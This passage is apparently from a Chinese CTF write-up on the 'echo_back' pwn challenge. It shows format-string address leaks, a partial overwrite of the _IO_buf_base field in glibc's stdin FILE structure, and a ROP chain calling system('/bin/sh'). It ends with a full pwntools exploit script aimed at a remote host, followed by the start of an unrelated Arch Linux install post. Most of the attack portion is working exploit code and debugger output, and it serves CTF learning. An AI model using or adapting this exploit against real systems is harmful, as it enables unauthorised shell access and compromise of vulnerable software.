<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#leaking_IO_buf_base</span></span><br><span class="line">_IO_2_1_stdin_ = libc_base + lib.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]</span><br><span class="line">_IO_buf_base = _IO_2_1_stdin_ + <span class="number">0x8</span> * <span class="number">7</span></span><br><span class="line">li(<span class="string">&#x27;_IO_buf_base&#x27;</span> + <span class="built_in">hex</span>(_IO_buf_base))</span><br></pre></td></tr></table></figure>

<p>来看看_IO_buf_base的值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0x7ffb6a2b08e0 &lt;_IO_2_1_stdin_&gt;:	0x00000000fbad208b	0x00007ffb6a2b0964</span><br><span class="line">0x7ffb6a2b08f0 &lt;_IO_2_1_stdin_+16&gt;:	0x00007ffb6a2b0964	0x00007ffb6a2b0963</span><br><span class="line">0x7ffb6a2b0900 &lt;_IO_2_1_stdin_+32&gt;:	0x00007ffb6a2b0963	0x00007ffb6a2b0963</span><br><span class="line">0x7ffb6a2b0910 &lt;_IO_2_1_stdin_+48&gt;:	0x00007ffb6a2b0963	0x00007ffb6a2b0963 &#x2F;&#x2F;IO_buf_base</span><br><span class="line">0x7ffb6a2b0920 &lt;_IO_2_1_stdin_+64&gt;:	0x00007ffb6a2b0964	0x0000000000000000 &#x2F;&#x2F;IO_buf_end</span><br><span class="line">0x7ffb6a2b0930 &lt;_IO_2_1_stdin_+80&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffb6a2b0940 &lt;_IO_2_1_stdin_+96&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffb6a2b0950 &lt;_IO_2_1_stdin_+112&gt;:	0x0000000000000000	0xffffffffffffffff</span><br><span class="line">0x7ffb6a2b0960 &lt;_IO_2_1_stdin_+128&gt;:	0x000000000a000000	0x00007ffb6a2b2790</span><br><span class="line">0x7ffb6a2b0970 &lt;_IO_2_1_stdin_+144&gt;:	0xffffffffffffffff	0x0000000000000000</span><br><span class="line">0x7ffb6a2b0980 &lt;_IO_2_1_stdin_+160&gt;:	0x00007ffb6a2b09c0	0x0000000000000000</span><br><span class="line">0x7ffb6a2b0990 &lt;_IO_2_1_stdin_+176&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffb6a2b09a0 &lt;_IO_2_1_stdin_+192&gt;:	0x00000000ffffffff	0x0000000000000000</span><br><span class="line">0x7ffb6a2b09b0 &lt;_IO_2_1_stdin_+208&gt;:	0x0000000000000000	0x00007ffb6a2af6e0</span><br></pre></td></tr></table></figure>
<p>先是stdin的位置,当前位于0x7ffb6a2b08e0</p>
<p>然后是_IO_buf_base，它位于0x7ffb6a2b08e0 + 0x8 * 7 = 0x7ffb6a2b0918 ，它的值为0x00007ffb6a2b0963 ， 并且要知道，它的值相对_IO_2_1_stdin_的地址总是不变的，假如我们把_IO_buf_base的低一字节覆盖为0，那么他就变成了0x00007ffb6a2b0900 ，也就是0x7ffb6a2b08e0 + 0x8 * 4处，跑到了结构体内部去了，是结构体中的第5个数据处，也是_IO_write_base处，并且由于_IO_buf_end没变，那么我们可以从0x00007ffb6a2b0900处向后输入0x64-0x00 = 0x64个字符，那么就能把_IO_buf_base和_IO_buf_end都覆盖成关键地址，就能绕过7个字符的输入限制,且可以实现write anything anywhere</p>
<p>先来覆盖_IO_buf_base的低1字节为0</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#modify _IO_buf_base</span></span><br><span class="line">sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p = p64(_IO_buf_base)</span><br><span class="line">sl(p)</span><br><span class="line">sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="number">7</span>))</span><br><span class="line">p = <span class="string">&#x27;%16$hhn&#x27;</span> <span class="comment">#不打印,即个数为0</span></span><br><span class="line">sl(p)</span><br></pre></td></tr></table></figure>

<p>接下来，就可以覆盖结构体里的一些数据了</p>
<p>对于_IO_buf_base之前的数据(_IO_write_base_IO_write_ptr, _IO_write_end)，最好原样的放回，不然不知道会出现什么问题，经过调试，发现它们的值都是0x83 + _IO_2_1_stdin_addr，然后接下来，覆盖_IO_buf_base和_IO_buf_end，将它设置为堆栈中的&amp;main ret, 然后即可实现写入数据时,就会向堆栈中写入数据,前提还需满足一些条件.</p>
<p>于是，payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#build payload to modify _IO_2_1_stdin struct</span></span><br><span class="line">p = p64(_IO_2_1_stdin_ + <span class="number">0x83</span>) * <span class="number">3</span></span><br><span class="line">p += p64(main_ret) + p64(main_ret + <span class="number">0x8</span> * <span class="number">3</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">sa(<span class="string">&#x27;:&#x27;</span>, p) <span class="comment">#length:</span></span><br><span class="line">sl(<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>在length:后面发送payload, 因为这个地方用到了scanf</p>
<p>现在，得绕过一个判断，这样调用scanf 输入数据时，才会往缓冲区写入输入的数据</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)  <span class="comment">//判断是否已经读完, 想要能写入缓冲数据,就得把让ptr &gt;= end,这样才能使新的数据重新读入到缓冲区里 </span></span><br><span class="line">   <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;  </span><br></pre></td></tr></table></figure>

<p>之前，覆盖结构体数据时，后面执行了这一步，使得 fp-&gt;_IO_read_end += count 相当于fp-&gt;_IO_read_end += len(p)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;  <span class="comment">//重新设置新的 _IO_buf_base</span></span><br><span class="line">....          ....</span><br><span class="line">count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,  <span class="comment">//系统向_IO_buf_base指向的缓冲区写入读取的数据</span></span><br><span class="line">          fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);<span class="comment">//写入长度:fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base</span></span><br><span class="line">....          ....</span><br><span class="line">fp-&gt;_IO_read_end += count; <span class="comment">//使 _IO_read_end指针向后移动</span></span><br></pre></td></tr></table></figure>
<p>下面为输入之前的_IO_2_1_stdin_</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x7fa95326b8e0 &lt;_IO_2_1_stdin_&gt;:	0x00000000fbad208b	0x00007fa95326b901 &#x2F;&#x2F;_IO_read_ptr</span><br><span class="line">									&#x2F;&#x2F;IO_read_end</span><br><span class="line">0x7fa95326b8f0 &lt;_IO_2_1_stdin_+16&gt;:	0x00007fa95326b928	0x00007fa95326b900</span><br><span class="line">0x7fa95326b900 &lt;_IO_2_1_stdin_+32&gt;:	0x00007fa95326b963	0x00007fa95326b963</span><br><span class="line">0x7fa95326b910 &lt;_IO_2_1_stdin_+48&gt;:	0x00007fa95326b963	0x00007ffddf79fbe8</span><br><span class="line">0x7fa95326b920 &lt;_IO_2_1_stdin_+64&gt;:	0x00007ffddf79fc00	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>而 getchar() 的作用是使fp-&gt;_IO_read_ptr + 1</p>
<p>由于在覆盖结构体后，scanf的后面有一个getchar，执行了一次，所以还需要调用len(p)-1次getchar()，使_IO_read_ptr ==  PIO_read_end</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#call getchar() make fp-&gt;_IO_read_ptr == fp-&gt;_IO_read_end</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(p) - <span class="number">1</span>):</span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">	sl(<span class="string">&#x27; &#x27;</span>)	</span><br></pre></td></tr></table></figure>

<p>调用 len(p) - 1次getchar()后, _IO_2_1_stdin_ 如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x &#x2F;40gx &amp;_IO_2_1_stdin_</span><br><span class="line">0x7f1a9a51f8e0 &lt;_IO_2_1_stdin_&gt;:	0x00000000fbad208b	0x00007f1a9a51f928 &#x2F;&#x2F;_IO_read_ptr</span><br><span class="line">                                    &#x2F;&#x2F;IO_read_end</span><br><span class="line">0x7f1a9a51f8f0 &lt;_IO_2_1_stdin_+16&gt;:	0x00007f1a9a51f928	0x00007f1a9a51f900</span><br><span class="line">0x7f1a9a51f900 &lt;_IO_2_1_stdin_+32&gt;:	0x00007f1a9a51f963	0x00007f1a9a51f963</span><br><span class="line">0x7f1a9a51f910 &lt;_IO_2_1_stdin_+48&gt;:	0x00007f1a9a51f963	0x00007fff14080e88</span><br><span class="line">0x7f1a9a51f920 &lt;_IO_2_1_stdin_+64&gt;:	0x00007fff14080ea0	0x0000000000000000</span><br><span class="line">0x7f1a9a51f930 &lt;_IO_2_1_stdin_+80&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="构造rop链"><a href="#构造rop链" class="headerlink" title="构造rop链"></a>构造rop链</h3><p>然后再次输入的时候,输入的数据就会在stack中了,现在就可以构造rop链.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#build rop chail</span></span><br><span class="line">sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p = p64(pop_rdi_ret) + p64(sh_addr) + p64(sys_addr)</span><br><span class="line">sla(<span class="string">&#x27;:&#x27;</span>, p) <span class="comment">#length:</span></span><br><span class="line">sl(<span class="string">&#x27;&#x27;</span>)	</span><br></pre></td></tr></table></figure>

<p>下面为输入修改后的堆栈</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack 50</span><br><span class="line">00:0000│ rsp  0x7fff92ceeed8 —▸ 0x55c9b5337ad4 ◂— movzx  eax, byte ptr [rbp - 0x10]</span><br><span class="line">01:0008│ rsi  0x7fff92ceeee0 ◂— 0x0</span><br><span class="line">02:0010│      0x7fff92ceeee8 ◂— 0x4a74f6baf7ec8d00</span><br><span class="line">03:0018│ rbp  0x7fff92ceeef0 —▸ 0x7fff92ceef00 —▸ 0x7fff92ceef30 —▸ 0x55c9b5337d30 ◂— push   r15</span><br><span class="line">04:0020│      0x7fff92ceeef8 —▸ 0x55c9b5337b43 ◂— pop    rbp</span><br><span class="line">05:0028│      0x7fff92ceef00 —▸ 0x7fff92ceef30 —▸ 0x55c9b5337d30 ◂— push   r15</span><br><span class="line">06:0030│      0x7fff92ceef08 —▸ 0x55c9b5337ccd ◂— mov    dword ptr [rbp - 0x14], eax</span><br><span class="line">07:0038│      0x7fff92ceef10 —▸ 0x55c9b5337d30 ◂— push   r15</span><br><span class="line">08:0040│      0x7fff92ceef18 ◂— 0xffffffda00000001</span><br><span class="line">09:0048│      0x7fff92ceef20 —▸ 0x7f53670f8918 (_IO_2_1_stdin_+56) —▸ 0x7fff92ceef38 —▸ 0x55c9b5337d93 ◂— pop    rdi</span><br><span class="line">0a:0050│      0x7fff92ceef28 ◂— 0x4a74f6baf7ec8d00</span><br><span class="line">0b:0058│      0x7fff92ceef30 —▸ 0x55c9b5337d30 ◂— push   r15</span><br><span class="line">0c:0060│      0x7fff92ceef38 —▸ 0x55c9b5337d93 ◂— pop    rdi &#x2F;&#x2F;修改为pop_rdi _ret</span><br><span class="line">0d:0068│      0x7fff92ceef40 —▸ 0x7f5366ec0d57 ◂— 0x68732f6e69622f &#x2F;* &#39;&#x2F;bin&#x2F;sh&#39; *&#x2F;</span><br><span class="line">0e:0070│      0x7fff92ceef48 —▸ 0x7f5366d79390 (system) ◂— test   rdi, rdi</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>只需使main函数ret即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#get shell</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Author: I0gan</span></span><br><span class="line"><span class="comment"># Team  : D0g3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import LibcSearcher</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]</span></span><br><span class="line"><span class="comment">#context.terminal = &#x27;konsole&#x27;</span></span><br><span class="line"><span class="comment">#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">exeFile  = <span class="string">&quot;echo_back&quot;</span></span><br><span class="line">libFile  = <span class="string">&quot;./libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line">remoteIp = <span class="string">&quot;111.198.29.45&quot;</span></span><br><span class="line">remotePort = <span class="number">54180</span></span><br><span class="line"></span><br><span class="line">LOCAL = <span class="number">1</span></span><br><span class="line">LIBC  = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">pd32  = <span class="keyword">lambda</span> x : p32(x).decode() <span class="comment">#python3 not surport str + bytes</span></span><br><span class="line">pd64  = <span class="keyword">lambda</span> x : p64(x).decode()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(x)</span><br><span class="line">db    = <span class="keyword">lambda</span>   : gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Func-----------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">eb</span>(<span class="params">length, text</span>):</span></span><br><span class="line">	sl(text)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># leaking libc base</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="number">7</span>))</span><br><span class="line">	p = <span class="string">&#x27;%19$p&#x27;</span></span><br><span class="line">	sl(p)</span><br><span class="line">	ru(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">	libc_start_main = <span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>) - <span class="number">240</span></span><br><span class="line">	libc_base = libc_start_main - lib.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">	li(<span class="string">&#x27;libc_base:&#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">	sys_addr = libc_base + lib.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">	sh_addr  = libc_base + lib.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">	</span><br><span class="line">	<span class="comment"># leaking elf base</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="number">7</span>))</span><br><span class="line">	p = <span class="string">&#x27;%14$p&#x27;</span></span><br><span class="line">	sl(p)</span><br><span class="line">	ru(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">	elf_base = <span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>) - <span class="number">0xD30</span></span><br><span class="line">	main_addr = elf_base + <span class="number">0xC6C</span></span><br><span class="line">	pop_rdi_ret = elf_base + <span class="number">0xd93</span></span><br><span class="line">	li(<span class="string">&#x27;elf_base:&#x27;</span> + <span class="built_in">hex</span>(elf_base))</span><br><span class="line"></span><br><span class="line">	<span class="comment">#leaking main ret in stack</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="number">7</span>))</span><br><span class="line">	p = <span class="string">&#x27;%12$p&#x27;</span></span><br><span class="line">	sl(p)</span><br><span class="line">	ru(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">	main_ret = <span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>) + <span class="number">0x8</span></span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	<span class="comment">#leaking IO_buf_base</span></span><br><span class="line">	_IO_2_1_stdin_ = libc_base + lib.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]</span><br><span class="line">	_IO_buf_base = _IO_2_1_stdin_ + <span class="number">0x8</span> * <span class="number">7</span></span><br><span class="line">	li(<span class="string">&#x27;_IO_buf_base&#x27;</span> + <span class="built_in">hex</span>(_IO_buf_base))</span><br><span class="line">		</span><br><span class="line">    <span class="comment">#modify _IO_buf_base</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	p = p64(_IO_buf_base)</span><br><span class="line">	sl(p)</span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="number">7</span>))</span><br><span class="line">	p = <span class="string">&#x27;%16$hhn&#x27;</span></span><br><span class="line">	sl(p)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#build payload to modify _IO_2_1_stdin struct</span></span><br><span class="line">	p = p64(_IO_2_1_stdin_ + <span class="number">0x83</span>) * <span class="number">3</span></span><br><span class="line">	p += p64(main_ret) + p64(main_ret + <span class="number">0x8</span> * <span class="number">3</span>)</span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	sa(<span class="string">&#x27;:&#x27;</span>, p) <span class="comment">#length:</span></span><br><span class="line">	sl(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="comment">#call getchar() make fp-&gt;_IO_read_ptr == fp-&gt;_IO_read_end</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(p) - <span class="number">1</span>):</span><br><span class="line">		sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">		sla(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">		sl(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="comment">#build rop chail</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	p = p64(pop_rdi_ret) + p64(sh_addr) + p64(sys_addr)</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, p) <span class="comment">#length:</span></span><br><span class="line">	sl(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">	<span class="comment">#db()</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">#get shell</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		exe = ELF(exeFile)</span><br><span class="line">		<span class="comment">#io = exe.process()</span></span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line">			io = exe.process(env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : libFile&#125;)</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		exe = ELF(exeFile)</span><br><span class="line">		io = remote(remoteIp, remotePort)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line">	</span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.i0gan.cn/2020/04/04/wp-echoback/" data-id="ckhemv84s005qwdcmck1e4bmc" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-install-arch-linux-and-config" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/04/03/install-arch-linux-and-config/" class="article-date">
  <time datetime="2020-04-03T05:30:09.000Z" itemprop="datePublished">2020-04-03</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/linux/">linux</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/04/03/install-arch-linux-and-config/">Install archlinux and configure</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Install-ArchLinux-and-configure-EFL"><a href="#Install-ArchLinux-and-configure-EFL" class="headerlink" title="Install ArchLinux and configure (EFL)"></a>Install ArchLinux and configure (EFL)</h1><h2 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h2><p>Platform : 小新pro13 [EFI]<br>制作Archlinux U盘启动器.开机进入Linux</p>
